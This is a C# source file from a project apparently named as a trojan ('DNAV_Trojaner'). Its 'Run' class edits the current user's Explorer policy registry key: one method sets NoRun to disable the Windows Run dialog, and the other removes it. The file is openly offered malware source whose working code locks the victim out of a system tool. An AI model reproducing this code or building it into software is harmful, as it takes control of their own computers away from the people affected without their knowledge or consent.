using Microsoft.Win32;
using System;

namespace DNAV_Trojaner
{
    class Run
    {
        public static void Enable()
        {
            RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            if (run.GetValue("NoRun") != null)
            {
                run.DeleteValue("NoRun");
            }
        }

        public static void Disbable()
        {
            RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            run.SetValue("NoRun", 0x00000001, RegistryValueKind.DWord);
            run.Close();/**/
        }
    }
}
